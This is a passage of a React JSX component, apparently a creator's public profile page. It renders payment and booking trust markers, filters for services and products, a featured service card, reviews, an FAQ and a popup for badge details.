                      { t: 'Secure Razorpay payment', d: 'M12 2l8 4v6c0 5-3.5 8-8 10-4.5-2-8-5-8-10V6z M9 12l2 2 4-4' },
                      { t: 'Instant confirmation',    d: 'M13 2 3 14h7l-1 8 10-12h-7z' },
                      { t: 'Google Calendar invite',  d: 'M3 4h18v18H3z M16 2v4 M8 2v4 M3 10h18' },
                    ].map(({ t, d }) => (
                      <div key={t} className="flex items-center gap-2.5 text-[12.5px]" style={{ color: C.secondary }}>
                        <svg className="w-4 h-4 flex-shrink-0" style={{ color: '#1F7A4D' }} fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24"><path d={d} /></svg>
                        {t}
                      </div>
                    ))}
                  </div>

                  {badges.length > 0 && (
                    <div className="flex flex-wrap justify-center gap-2 mt-5">
                      {badges.map((b, i) => <Badge key={i} badge={b} onSelect={setBadgeInfo} />)}
                    </div>
                  )}

                  {socialLinks.length > 0 && (
                    <div className="flex flex-wrap justify-center gap-2 mt-5">
                      {socialLinks.map(({ key, href }) => (
                        <SocialIcon key={key} platform={key} href={href} />
                      ))}
                    </div>
                  )}

                  {host.location && (
                    <div className="flex items-center justify-center gap-1.5 mt-5 text-xs" style={{ color: C.muted }}>
                      <svg className="w-3.5 h-3.5 flex-shrink-0" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z" /><circle cx="12" cy="10" r="3" />
                      </svg>
                      {host.location}
                    </div>
                  )}
                </div>
              </div>
            </div>
          </aside>

          {/* ── RIGHT — offerings ──────────────────────── */}
          <section className="w-full lg:flex-1 min-w-0">

            {/* Header + icon filters */}
            <div id="offerings" className="flex items-start gap-3 flex-wrap mb-5" style={{ scrollMarginTop: 82 }}>
              <div className="flex-1 min-w-[180px]">
                <div className="font-serif italic text-base" style={{ color: '#E0506F' }}>Creator's</div>
                <h2 className="font-display font-extrabold text-2xl sm:text-3xl tracking-tight" style={{ color: C.text }}>Offerings</h2>
              </div>

              {/* Category icon filters (Services always; Products only when present) */}
              <div className="flex gap-1.5 flex-shrink-0 rounded-full p-1" style={{ background: C.card, border: `1px solid ${C.border}` }} role="tablist">
                {[
                  { f: 'all',     label: 'All',      count: services.length + products.length,
                    icon: <><rect x="3" y="3" width="7" height="7" rx="1.5" /><rect x="14" y="3" width="7" height="7" rx="1.5" /><rect x="3" y="14" width="7" height="7" rx="1.5" /><rect x="14" y="14" width="7" height="7" rx="1.5" /></> },
                  { f: 'service', label: 'Services',
                    icon: <><rect x="3" y="4" width="18" height="18" rx="2" /><path d="M16 2v4M8 2v4M3 10h18" /></> },
                  ...(hasProducts ? [{ f: 'product', label: 'Products',
                    icon: <path d="M12 2 2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" /> }] : []),
                ].map(({ f, label, icon, count }) => {
                  const on = filter === f;
                  return (
                    <button key={f} onClick={() => setFilter(f)} role="tab" aria-selected={on} title={label} aria-label={label}
                      className="relative flex items-center justify-center rounded-full transition-colors"
                      style={{ width: 40, height: 40, background: on ? tc : 'transparent', color: on ? '#fff' : C.secondary }}>
                      <svg className="w-[18px] h-[18px]" fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24">{icon}</svg>
                      {f === 'all' && count > 0 && (
                        <span className="absolute -top-0.5 -right-0.5 min-w-[15px] h-[15px] px-1 rounded-full text-[9.5px] font-bold flex items-center justify-center" style={{ background: '#E0506F', color: '#fff' }}>{count}</span>
                      )}
                    </button>
                  );
                })}
              </div>
            </div>

            {/* Intro CTA — soft, low-friction entry when the host offers a free service */}
            {introService && (filter === 'all' || filter === 'service') && (
              <Link to={`/${profileSlug}/booking/${introService.slug}`} aria-label="Start with a free intro session"
                className="flex items-center gap-3 rounded-2xl mb-5 px-4 py-3 transition-opacity hover:opacity-90"
                style={{ background: `${tc}0D`, border: `1px solid ${tc}33` }}>
                <span className="flex items-center justify-center flex-shrink-0 rounded-full" style={{ width: 36, height: 36, background: tc, color: '#fff' }}>
                  <svg className="w-[18px] h-[18px]" fill="none" stroke="currentColor" strokeWidth={2} strokeLinecap="round" strokeLinejoin="round" viewBox="0 0 24 24"><path d="M13 2 3 14h7l-1 8 10-12h-7z" /></svg>
                </span>
                <span className="min-w-0 flex-1">
                  <span className="block font-display font-bold text-sm leading-tight truncate" style={{ color: C.text }}>New here? Start with a free intro</span>
                  <span className="block text-xs truncate" style={{ color: C.secondary }}>{introService.title}</span>
                </span>
                <span className="flex-shrink-0 text-sm font-semibold rounded-full flex items-center" style={{ height: 36, padding: '0 16px', background: tc, color: '#fff' }}>Book free</span>
              </Link>
            )}

            {/* Featured hero — leads the "all" view with the host's first service */}
            {featured && (() => {
              const bookUrl = featured.slug ? `/${profileSlug}/booking/${featured.slug}` : null;
              const desc = featured.short_description || featured.description || '';
              return (
                <div className="relative rounded-3xl overflow-hidden mb-5" style={{ background: C.card, border: `1px solid ${C.border}`, boxShadow: '0 10px 30px rgba(150,13,50,0.07)' }}>
                  <span className="absolute top-4 left-4 z-10 inline-flex items-center gap-1.5 text-[11px] font-semibold rounded-full px-3 py-1" style={{ background: tc, color: '#fff' }}>
                    <svg className="w-3 h-3" viewBox="0 0 24 24" fill="currentColor"><path d="M13 2 3 14h7l-1 8 10-12h-7z" /></svg>Featured
                  </span>
                  <div className="flex flex-col sm:flex-row">
                    <div className="flex items-center justify-center flex-shrink-0 sm:w-48 min-h-[140px]" style={{ background: `linear-gradient(135deg, ${tc}, #E0506F)`, color: '#fff' }}>
                      <svg className="w-16 h-16 opacity-95" fill="none" stroke="currentColor" strokeWidth={1.6} viewBox="0 0 24 24"><circle cx="11" cy="11" r="7" /><path d="m21 21-4.3-4.3" /><path d="M11 8v3l2 1.5" /></svg>
                    </div>
                    <div className="p-6 flex-1 min-w-0">
                      <h3 className="font-display font-extrabold text-xl leading-tight" style={{ color: C.text }}>{featured.title}</h3>
                      {desc && <p className="text-sm mt-2 line-clamp-2" style={{ color: C.secondary }}>{desc}</p>}
                      <div className="flex items-center gap-4 text-xs mt-3" style={{ color: C.secondary }}>
                        <span>{featured.duration} min</span>
                        <span>{featured.meeting_mode === 'offline' ? 'In-person' : 'Online'}</span>
                      </div>
                      <div className="flex flex-wrap items-center gap-4 mt-4">
                        <div className="font-display font-extrabold text-2xl" style={{ color: C.text }}>{cardPriceLabel(featured)}</div>
                        {bookUrl && (
                          <Link to={bookUrl} className="inline-flex items-center rounded-full font-semibold text-sm transition-opacity hover:opacity-90" style={{ height: 46, padding: '0 22px', background: 'var(--profile-accent, #960D32)', color: 'var(--profile-accent-text, #ffffff)' }}>Book Now</Link>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              );
            })()}

            {/* Services grid */}
            {showServices && gridServices.length > 0 && (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                {gridServices.map(s => (
                  <ServiceCard key={s.id} service={s} profileSlug={profileSlug} />
                ))}
              </div>
            )}

            {/* Products */}
            {showProducts && (
              <div className={showServices && gridServices.length ? 'mt-6' : ''}>
                {filter === 'all' && <h3 className="font-display font-bold text-lg mb-4" style={{ color: C.text }}>Digital Products</h3>}
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  {products.map(p => (
                    <ProductCard key={p.id} product={p} profileSlug={profileSlug} />
                  ))}
                </div>
              </div>
            )}

            {/* Empty state */}
            {nothingShown && (
              <div className="rounded-2xl py-16 text-center" style={{ background: C.card, border: `1px dashed ${C.border}` }}>
                <p style={{ color: C.muted }}>
                  {filter === 'product' ? 'No products yet.' : 'No services available yet.'}
                </p>
              </div>
            )}

            {/* Reviews */}
            {reviewData.count > 0 && (
              <div className="mt-10">
                <button onClick={() => setShowReviews(v => !v)} className="flex items-center gap-3 mb-4">
                  <h2 className="font-display font-bold text-xl" style={{ color: C.text }}>What people say</h2>
                  <Stars avg={reviewData.avg} count={reviewData.count} size="lg" />
                  <svg className={`w-4 h-4 transition-transform ${showReviews ? 'rotate-180' : ''}`}
                    style={{ color: C.muted }} fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 9l-7 7-7-7" />
                  </svg>
                </button>
                {showReviews && (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    {reviewData.reviews.map(r => (
                      <div key={r.id} className="rounded-2xl p-4" style={{ background: C.card, border: `1px solid ${C.border}` }}>
                        <div className="flex items-start gap-3">
                          <div className="w-9 h-9 rounded-full flex items-center justify-center text-sm font-bold flex-shrink-0"
                            style={{ background: tc, color: '#fff' }}>
                            {r.profiles?.name?.charAt(0) || '?'}
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2 mb-1">
                              <span className="text-sm font-semibold" style={{ color: C.text }}>{r.profiles?.name || 'Anonymous'}</span>
                              <Stars avg={r.rating} count={0} />
                            </div>
                            {r.comment && <p className="text-sm leading-relaxed" style={{ color: C.secondary }}>{r.comment}</p>}
                            <p className="text-xs mt-1" style={{ color: C.muted }}>
                              {new Date(r.created_at).toLocaleDateString('en-IN', { month: 'short', day: 'numeric', year: 'numeric' })}
                            </p>
                          </div>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}

            {/* FAQ — templated from real profile data; powers the FAQPage schema. */}
            {faqs.length > 0 && (
              <div className="mt-10">
                <h2 className="font-display font-bold text-xl mb-4" style={{ color: C.text }}>Frequently asked questions</h2>
                <FaqAccordion faqs={faqs} colors={C} />
              </div>
            )}
          </section>
        </div>
      </div>

      <Footer />
    </div>
      )}

      {/* Badge info popup — bottom-right, click-triggered, auto-dismiss 5s. */}
      {badgeInfo && (
        <div className="fixed bottom-4 right-4 z-[60] w-[min(20rem,calc(100vw-2rem))]" role="status" aria-live="polite">
          <div className="flex items-start gap-3 rounded-2xl bg-white p-3 shadow-lg" style={{ border: `1px solid ${C.border}` }}>
            <div className="flex-shrink-0 flex items-center justify-center overflow-hidden"
              style={{ width: 40, height: 40, borderRadius: 12, background: '#F5ECEA', border: `1px solid ${C.border}` }}>
              {badgeInfo.image_url
                ? <img src={badgeInfo.image_url} alt="" className="w-full h-full object-contain" />
                : <span className="font-extrabold" style={{ color: C.text }}>{(badgeInfo.name || 'B').charAt(0).toUpperCase()}</span>}
            </div>
            <div className="min-w-0 flex-1">
              <p className="text-sm font-bold" style={{ color: C.text }}>{badgeInfo.name}</p>
              {badgeInfo.description && (
                <p className="mt-0.5 text-xs leading-snug" style={{ color: C.secondary }}>{badgeInfo.description}</p>
              )}
            </div>
            <button type="button" onClick={() => setBadgeInfo(null)} aria-label="Dismiss"
              className="ml-1 flex-shrink-0 leading-none text-gray-400 hover:text-gray-600">✕</button>
          </div>
        </div>
      )}
    </>
  );
};

export default HostProfile;
